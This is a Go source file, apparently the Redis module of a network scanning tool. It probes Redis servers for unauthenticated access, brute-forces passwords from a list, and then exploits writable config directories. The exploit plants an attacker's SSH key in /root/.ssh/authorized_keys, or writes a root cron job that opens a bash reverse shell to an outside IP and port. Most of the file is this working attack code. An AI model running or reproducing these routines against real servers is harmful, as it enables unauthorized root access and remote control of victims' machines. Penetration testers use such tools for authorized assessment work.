package Plugins

import (
	"bufio"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"github.com/tomatome/grdp/glog"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string
	dir        string
)

func RedisScan(configInfo *common.ConfigInfo, hostInfo *common.HostInfo) (tmperr error) {
	starttime := time.Now().Unix()
	flag, err := RedisUnauth(configInfo, hostInfo)
	if flag == true && err == nil {
		return err
	}
	if configInfo.IsBrute {
		return
	}
	for _, pass := range common.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		flag, err := RedisConn(configInfo, hostInfo, pass)
		if flag == true && err == nil {
			return err
		} else {
			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", hostInfo.Host, hostInfo.Ports, pass, err)
			common.LogError(&configInfo.LogInfo, errlog)
			tmperr = err
			if common.CheckErrs(err) {
				return err
			}
			if time.Now().Unix()-starttime > (int64(len(common.Passwords)) * configInfo.Timeout) {
				return err
			}
		}
	}
	return tmperr
}

func RedisConn(configInfo *common.ConfigInfo, hostInfo *common.HostInfo, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", hostInfo.Host, hostInfo.Ports)
	conn, err := common.WrapperTcpWithTimeout(configInfo.Socks5Proxy, "tcp", realhost, time.Duration(configInfo.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(configInfo.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
			common.LogSuccess(&configInfo.LogInfo, result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
			common.LogSuccess(&configInfo.LogInfo, result)
		}
		err = Expoilt(realhost, conn, configInfo)
	}
	return flag, err
}

func RedisUnauth(configInfo *common.ConfigInfo, hostInfo *common.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", hostInfo.Host, hostInfo.Ports)
	conn, err := common.WrapperTcpWithTimeout(configInfo.Socks5Proxy, "tcp", realhost, time.Duration(configInfo.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(configInfo.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s unauthorized", realhost)
			common.LogSuccess(&configInfo.LogInfo, result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
			common.LogSuccess(&configInfo.LogInfo, result)
		}
		err = Expoilt(realhost, conn, configInfo)
	}
	return flag, err
}

func Expoilt(realhost string, conn net.Conn, info *common.ConfigInfo) error {
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		return err
	}
	if flagSsh == true {
		result := fmt.Sprintf("[+] Redis %v like can write /root/.ssh/", realhost)
		common.LogSuccess(&info.LogInfo, result)
		if info.RedisFile != "" {
			writeok, text, err := writekey(conn, info.RedisFile)
			if err != nil {
				glog.Errorf(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] Redis %v SSH public key was written successfully", realhost)
				common.LogSuccess(&info.LogInfo, result)
			} else {
				glog.Errorf("[-] Redis ", realhost, "SSHPUB write failed", text)
			}
		}
	}

	if flagCron == true {
		result := fmt.Sprintf("[+] Redis %v like can write /var/spool/cron/", realhost)
		common.LogSuccess(&info.LogInfo, result)
		if info.RedisShell != "" {
			writeok, text, err := writecron(conn, info.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] Redis %v /var/spool/cron/root was written successfully", realhost)
				common.LogSuccess(&info.LogInfo, result)
			} else {
				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
			}
		}
	}
	err = recoverdb(dbfilename, dir, conn)
	return err
}

func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err := conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			target := strings.Split(host, ":")
			if len(target) < 2 {
				return flag, "host error", err
			}
			scanIp, scanPort := target[0], target[1]
			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func readreply(conn net.Conn) (string, error) {
	conn.SetReadDeadline(time.Now().Add(time.Second))
	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		err = nil
	}
	return string(bytes), err
}

func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	var text string
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flag, flagCron, err
}

func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	return
}
